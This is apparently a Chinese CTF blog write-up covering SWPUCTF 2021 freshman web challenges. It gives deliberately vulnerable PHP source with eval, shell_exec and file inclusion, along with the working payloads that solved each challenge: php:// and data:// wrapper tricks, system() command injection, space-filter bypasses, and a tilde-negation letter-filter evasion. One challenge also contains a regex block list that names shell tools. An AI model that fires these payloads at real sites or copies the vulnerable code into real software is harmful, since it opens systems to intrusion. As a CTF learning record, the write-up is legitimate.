---
title: SWPUCTF 2021 新生赛
date: 2022-05-14 22:12:01
tags:
- PHP伪协议
- RCE
categories: CTF-Web
my: SWPUCTF_freshman-match
---

 

部分题目WP

## **PseudoProtocols**(伪协议)

看到题目就是伪协议   直接用下面代码查看hint.php

```
?wllm=php://filter/read=convert.base64-encode/resource=hint.php
```

base64解码后看见

```
<?php
//go to /test2222222222222.php
?>
```

直接访问出现下列代码

```
<?php
ini_set("max_execution_time", "180");
show_source(__FILE__);
include('flag.php');
$a= $_GET["a"];
if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){
    echo "success\n";
    echo $flag;
}
?>
```

第一种解法用下面的payload就可以得到flag

```
?a=data://text/plain,I want flag
```

第二种解法

```
?a=php://input
```

用burp  POST传参也能得到flag

![](https://s2.loli.net/2022/05/15/dsHFWywYONq2LMp.png)

## **include**

直接由题意传file    直接?file=1

![](https://s2.loli.net/2022/05/15/eDBxHYfQFMbz2uN.png)

"allow_url_include"，"on"意味存在着文件包含漏洞  payload如下  也可查看[php伪协议](https://segmentfault.com/a/1190000018991087)

```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

![](https://s2.loli.net/2022/05/15/DwGZmnfPHuSzTq1.png)

再进行base64解码得到flag

## **RCE部分**

### **easyrce**

源码

```
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['url']))
{
eval($_GET['url']);
}
?>
```

有eval 但是是get传参 将传入的内容作为php代码执行 利用php可以执行Linux命令

用下列payload查看根目录

```
?url=system('ls /');
```

![](https://s2.loli.net/2022/05/15/OukxLdMYW93ZaoQ.png)

发现在根目录下  直接cat指令读取文件  拿到flag

```
?url=system('cat /flllllaaaaaaggggggg');
```

### **babyrce**

源码：

```
<?php
error_reporting(0);
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
if($_COOKIE['admin']==1) 
{
    include "../next.php";
}
else
    echo "小饼干最好吃啦！";
?> 小饼干最好吃啦！
```

看见题目 cookie传参，键名为admin，值为1，直接传

![](https://s2.loli.net/2022/05/15/ns2AIqJNZ9OrdTc.png)

发现rasalghul.php我们去访问

```
<?php
error_reporting(0);
highlight_file(__FILE__);
error_reporting(0);
if (isset($_GET['url'])) {
  $ip=$_GET['url'];
  if(preg_match("/ /", $ip)){
      die('nonono');   //这里过滤了空格 如果 用到了空格输出nonono
  }
  $a = shell_exec($ip);
  echo $a;
}
?>
```

我们可以用其他符号代替$IFS、IFS$9、%09具体可以百度

直接看根目录  发现 flag  

![](https://s2.loli.net/2022/05/15/ZmyugPC1AJQX9I6.png)

然后cat 拿到flag

![](https://s2.loli.net/2022/05/15/UirzT23vXxMLuRW.png)



### **finalyrce**

```
<?php
highlight_file(__FILE__);
if(isset($_GET['url']))
{
    $url=$_GET['url'];
    if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url))
    {
        echo "Sorry,you can't use this.";
    }
    else
    {
        echo "Can you see anything?";
        exec($url);
    }
}
```

这道题就过滤了很多字符   通过[Linux tee命令](https://www.runoob.com/linux/linux-comm-tee.html)写入文件 用dir / | tee guxi可以在当前目录下生成guxi文件

然后去访问url/guxi就可以访问guxi文件

![](https://s2.loli.net/2022/05/15/SbpIiMAmDntJqTO.png)

找到flag  可以用tac代替cat命令  发现直接读取不行   仔细代码审计发现过滤了la没有过滤?我们可以用?代替字母即可

![](https://s2.loli.net/2022/05/15/ifIbCKlPdZozrcn.png)

然后再访问guxi文件就能看见flag

![](https://s2.loli.net/2022/05/15/G8anzRiSHvUb7Z4.png)

### **hardrce**

源码:

```
<?php
header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['wllm']))
{
    $wllm = $_GET['wllm'];
    $blacklist = [' ','\t','\r','\n','\+','\[','\^','\]','\"','\-','\$','\*','\?','\<','\>','\=','\`',];
    foreach ($blacklist as $blackitem)
    {
        if (preg_match('/' . $blackitem . '/m', $wllm)) {
        die("LTLT说不能用这些奇奇怪怪的符号哦！");
    }}
if(preg_match('/[a-zA-Z]/is',$wllm))
{
    die("Ra's Al Ghul说不能用字母哦！");
}
echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
eval($wllm);
}
else
{
    echo "蔡总说：注意审题！！！";
}
?> 蔡总说：注意审题！！！
```

打开题目 我直接人麻了  过滤了很多  但仔细看有一个符号没有被过滤“~”取反符号

具体可查看[此文章](https://blog.csdn.net/WilliamsWayne/article/details/78259501)

百度用php在线工具   直接取反命令

![](https://s2.loli.net/2022/05/15/5prIwVCvGzoiKU3.png)

查看到了根目录 

![](https://s2.loli.net/2022/05/15/ZhM9e5Hz2Vrj6Uy.png)

在取反cat命令

![](https://s2.loli.net/2022/05/15/an5mp489BQt3L2z.png)

直接拿到flag

![](https://s2.loli.net/2022/05/15/FThj4ElRCK9rVwL.png)



还有一道我太菜了 写不来
